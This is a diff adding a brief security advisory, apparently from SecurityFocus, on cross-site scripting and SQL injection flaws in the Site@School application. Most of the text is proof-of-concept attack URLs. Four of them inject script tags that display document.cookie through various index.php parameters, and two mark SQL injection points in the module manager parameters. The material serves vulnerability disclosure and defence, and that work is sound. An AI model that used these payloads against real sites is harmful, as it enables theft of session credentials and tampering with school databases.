@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/50195/info
+
+Site@School is prone to multiple SQL-injection and cross-site scripting vulnerabilities.
+
+Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+XSS:
+
+http://www.example.com/school/starnet/index.php?option=stats&suboption=&#039;"</style></script><script>alert(document.cookie)</script> 
+
+http://www.example.com/school/starnet/index.php?option=pagemanager&suboption=newsection&site=&#039;"</style></script><script>alert(document.cookie)</script> 
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&modoption=edit&module_number="</style></script><script>alert(document.cookie)</script> 
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&module=&#039;"</style></script><script>alert(document.cookie)</script>
+
+SQL Injection:
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&modoption=edit&module_number=[sql injection]
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&module=[sql injection]
